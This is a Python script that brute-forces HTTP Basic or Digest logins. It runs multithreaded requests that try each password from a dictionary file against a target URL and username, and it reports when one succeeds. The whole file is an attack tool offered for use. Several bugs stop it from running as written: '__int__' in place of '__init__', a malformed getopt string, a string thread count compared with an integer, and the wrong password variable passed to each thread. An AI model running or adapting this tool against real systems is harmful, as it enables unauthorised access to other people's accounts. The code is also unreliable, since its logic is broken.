#!/usr/bin/python

import requests
from threading import Thread
import sys
import time
import getopt
from requests.auth import HTTPDigestAuth

global hit
hit = "1"

def banner():
    print('******** Base or Digest Brute Force**********')

def usage():
    print("Usgae :")
    print("   -w: url(Http://site.com")
    print("   -u: Username")
    print("   -t: number of Thread")
    print("   -f: dict file")
    print("   -m: method (basic or digest")
    print("Example baseordigestauth.py -w htt[://] -u admin -t 5 -f password.txt")


class request_performer(Thread):
    def __int__(self,passwords, user,url, method):
        Thread.__int__(self)
        self.password = passwords.split('\n')[0]
        self.username = user
        self.url = url
        self.method = method
        print("--"+ self.password + "--")
    
    def run(self):
        global hit 
        if  hit == "1":
            try:
                if self.method == "basic":
                    r = requests.get(self.url, auth=(self.username, self.password))
                elif self.method == "digest":
                    r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password))
                
                if r.status_code == 200 :
                    hit = "0"
                    print("Password found - " + self.password + " -- User " + self.username)
                else:
                    print("Not valid password .. " + self.password)
                    i[0] = i[0]-1
                    
            except Exception as e:
                print(e)
def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "u:w:f:m:t")
    except getopt.GetoptError:
        print("error on argument")
        sys.exit()
    
    for opt , arg in opts:
        if opt == '-u':
            user = arg
        elif opt == '-w':
            url = arg 
        elif opt == '-f':
            dictionary = arg
        elif opt == '-t':
            threads = arg
        elif opt == '-m':
            method = arg
    
    try:
        f = open(dictionary, 'r')
        passwords = f.readlines()
    except:
        print("error ocuured while reading file")
        sys.exit()

    laucher_thread (passwords ,threads, user, url, method)

def laucher_thread(passwords, threads, user, url, method):
    global i
    i =[]
    i.append(0)
    while len(passwords):
        if hit == "1":
            try:
                if i[0] < threads:
                    passwd = passwords.pop(0)
                    i[0] = i[0] +1
                    thread = request_performer(passwords, user,url, method)
                    thread.start()
            except KeyboardInterrupt:
                print("KeyboardInterrupt")
                sys.exit(1)
            thread.join()
                    

if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("KeyboardInterrupt")
